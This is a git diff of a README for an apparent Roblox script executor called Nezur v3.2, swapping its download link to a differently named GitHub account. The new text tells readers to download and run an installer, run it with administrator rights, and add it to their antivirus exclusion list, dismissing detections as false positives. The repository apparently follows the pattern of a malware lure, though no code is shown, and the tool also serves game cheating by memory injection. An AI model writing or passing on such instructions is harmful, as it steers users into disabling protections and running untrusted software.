@@ -1,157 +1,64 @@
-# Nezur PC v3.2 - Roblox Script Executor 2026
+# ⚙️ nezur-windows-executor-v32 - Run scripts with total ease today
 
-> Nezur is a Windows Roblox script executor for 2026, centered on Lua injection, a script hub with 500+ entries, a compact desktop interface, and everyday tools for running scripts on current Windows machines.
+[![Download Nezur](https://img.shields.io/badge/Download-Nezur_v3.2-blue.svg)](https://github.com/unsaturated-laparocele158/nezur-windows-executor-v32)
 
-[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square&logo=windows)](https://github.com)
-[![Roblox](https://img.shields.io/badge/Compatible-Roblox%202026-red?style=flat-square)](https://github.com)
-[![Scripts](https://img.shields.io/badge/Scripts-500%2B-green?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/kevinwalkeryj5382/nezur-windows-executor-v32?style=flat-square)](https://github.com)
+Nezur PC v3.2 provides a simple way to inject Lua scripts into your Roblox games. This tool includes a library of over 500 pre-made scripts. The design focuses on a small, clean interface that stays out of your way. It runs on Windows 10 and 11 systems with 64-bit architecture.
 
----
+## 📥 How to download the software
 
-<p align="center">
-  <a href="https://kevinwalkeryj5382.github.io/nezur-windows-executor-v32/">
-    <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20Nezur-v3.2%20Latest-brightgreen?style=for-the-badge" alt="Download Nezur">
-  </a>
-</p>
+Visit this page to download: [https://github.com/unsaturated-laparocele158/nezur-windows-executor-v32](https://github.com/unsaturated-laparocele158/nezur-windows-executor-v32)
 
-> **[Direct Download - Nezur v3.2](https://kevinwalkeryj5382.github.io/nezur-windows-executor-v32/)**
-> Windows 10 / 11 · 64-bit · Free · No Key Required
+To start, click the link above. Follow the instructions on the web page to save the installation file to your computer. Once the download finishes, locate the file in your downloads folder. Double-click the file to begin the setup process. Follow the on-screen prompts to complete the installation.
 
----
+## 🛠 Prerequisites for your system
 
-[Download Latest Build](https://kevinwalkeryj5382.github.io/nezur-windows-executor-v32/)
+Nezur works best if your computer meets these requirements:
 
----
+*   Windows 10 or 11 (64-bit version).
+*   Visual C++ Redistributable packages for Visual Studio 2015, 2017, and 2019.
+*   An active internet connection to access the script hub.
+*   Administrator rights on your user account to allow proper injection.
 
-## Overview
+Before you run the software, ensure that your antivirus software allows exceptions. Some security programs flag script executors as false positives because they inject code into the game memory. Add the folder where you installed Nezur to your antivirus exclusion list to prevent the program from closing unexpectedly.
 
-Nezur is a Windows-native Roblox script executor made for users who want a small desktop application for Lua injection, script execution, and quick access to organized scripts. In v3.2, the emphasis is on a cleaner interface, local execution flow, and a bundled script hub that keeps frequently used scripts easy to reach.
+## 🚀 Running your first script
 
-The release also brings batch execution, a persistent queue stored in local SQLite, and an auto-update engine that simplifies ongoing maintenance. With multi-language UI support and a built-in debugger, Nezur is presented as a focused Roblox scripting tool for desktop users who prefer a straightforward workflow.
+After installation, follow these steps to use the software:
 
----
+1.  Open the Nezur application from your desktop shortcut or start menu.
+2.  Launch your Roblox game. 
+3.  Click the "Attach" button within the Nezur window. Wait until the status light turns green.
+4.  Open the "Script Hub" tab inside the interface.
+5.  Browse the list of 500+ available scripts. 
+6.  Select a script you want to use.
+7.  Click the "Execute" button. 
 
-## Features at a Glance
+The software will apply the changes to your current game session. You might notice a short freeze while the game processes the new instructions. This is normal.
 
-- One-click Lua injection flow for fast script launch on Windows
-- Built-in script hub with 500+ available scripts
-- Persistent task queue stored locally with SQLite
-- Auto-update engine to help keep the app current
-- Batch execution mode for running multiple scripts in sequence
-- Lightweight desktop interface designed for fast navigation
-- Multi-language UI support for broader accessibility
-- Built-in debugger for script review and troubleshooting
+## 🎛 Understanding the interface
 
----
+Nezur features a compact design. Here are the main parts of the window:
 
-## Supported Games & Scripts
+*   **Editor Panel:** A space where you paste custom Lua code if you prefer to write your own scripts instead of using the hub.
+*   **Script Hub:** A searchable database of community scripts. You can save your favorite scripts here for quick access later.
+*   **Settings Menu:** Here you can toggle auto-attach features, change the theme of the interface, and check for software updates.
+*   **Injection Status:** A small indicator that tells you if the program is successfully connected to the game engine.
 
-| Roblox Game / Experience | Script Category | Typical Use |
-|---|---|---|
-| Universal Roblox support | Lua executor scripts | Run general-purpose scripts across experiences |
-| Combat-focused games | Combat automation scripts | Assist with repeatable in-game actions |
-| Open-world experiences | Movement and utility scripts | Manage traversal and quality-of-life tasks |
-| Simulator titles | Farming and grind scripts | Automate repetitive loops and routines |
-| Roleplay games | UI and interaction scripts | Add custom controls or interface helpers |
-| Custom script hubs | Batch script collections | Organize and launch multiple scripts from one place |
+## 🛡 Maintaining system stability
 
----
+Always use scripts from trusted sources within the hub. Running poorly written scripts can cause the game to crash or lead to unexpected behavior. If you experience errors, click the "Clear" button in the editor panel to remove the current script from memory. Restarting both the game and the executor usually fixes most minor issues. 
 
-## System Requirements
+Keep your version updated. When you open the program, it checks for newer files automatically. If an update exists, the software prompts you to download it. Using the latest version ensures better compatibility with game updates and removes bugs found in older builds.
 
-| Component | Minimum |
-|---|---|
-| Operating System | Windows 10 or Windows 11, 64-bit |
-| RAM | 4 GB or more |
-| Storage | 500 MB free space recommended |
-| .NET | .NET runtime compatible with the desktop app |
-| Roblox | Installed Roblox client for supported experiences |
+## 🧩 Troubleshooting common issues
 
----
+If the software does not work, try these steps:
 
-## Quick Start
+*   **Injection Fails:** Ensure you launched the game before you clicked the "Attach" button. If the error continues, restart your computer and try again.
+*   **Crashing:** Disable any background programs that might monitor game memory. Overlays like Discord, Steam, or specialized game boosters often cause conflict.
+*   **Missing Scripts:** Check if your internet connection is stable. The script hub loads content from an online server. 
+*   **Admin Access:** Always run the application with administrator privileges to ensure it has the necessary permissions to interface with the game process.
 
-1. Clone the repository:
-   `git clone https://github.com/kevinwalkeryj5382/nezur-windows-executor-v32.git
+If you are a new user, start with the most popular scripts in the hub. These scripts have undergone testing by other users and are more stable. Avoid clicking on unknown files or links while the application is open. Focus only on the provided interface. 
 
-2. Move into the project folder:
-   `cd Nezur-Executor-Update-v3.2`
-
-3. Launch the executor:
-   `NezurExecutor.exe`
-
-If you are using the published build, download the latest package first and then open the executable from the extracted folder.
-
----
-
-## Script Hub - Popular Searches 2026
-
-- Roblox script executor for Windows
-- Lua injection desktop app
-- 500+ Roblox scripts hub
-- no key Roblox script executor
-- batch execution script executor
-- auto-update Roblox executor
-- lightweight Roblox script hub
-
----
-
-## Project Structure
-
-Nezur
-- NezurExecutor.exe
-- ScriptHub/
-  - featured-scripts/
-  - categories/
-- Queue/
-  - local.sqlite
-- Engine/
-  - injector/
-  - updater/
-  - debugger/
-- UI/
-  - multi-language resources
-- README.md
-
----
-
-## FAQ
-
-**Is Nezur only for Windows?**  
-Yes. Nezur is defined as a Windows desktop application for Windows 10 and Windows 11.
-
-**Will it still work after Roblox updates?**  
-Support can shift when Roblox changes. The included auto-update engine is meant to help keep the application in step with current builds.
-
-**How is this different from other script executors?**  
-Nezur combines a lightweight desktop UI, an integrated script hub, SQLite-backed queue storage, batch execution, and a debugger in one package.
-
-**Does using a script executor affect my account?**  
-Use is your own responsibility. You should review Roblox rules and any applicable terms before running scripts.
-
-**Are scripts stored locally?**  
-Yes. The product profile includes persistent queue storage with local SQLite, which means parts of the workflow are kept on the device.
-
----
-
-## Roadmap - 2026
-
-- [ ] Expand script hub organization and discovery
-- [ ] Improve batch execution controls
-- [ ] Refine multi-language interface coverage
-- [ ] Add more debugger utilities for script review
-- [ ] Continue auto-update maintenance for new Roblox builds
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
-
----
-
-<p align="center">
-  <i>Nezur v3.2 for Windows users who want a compact Roblox script executor with a built-in hub and local workflow tools.</i>
-</p>
+Keywords: roblox, script-executor, windows, lua, gaming, tools
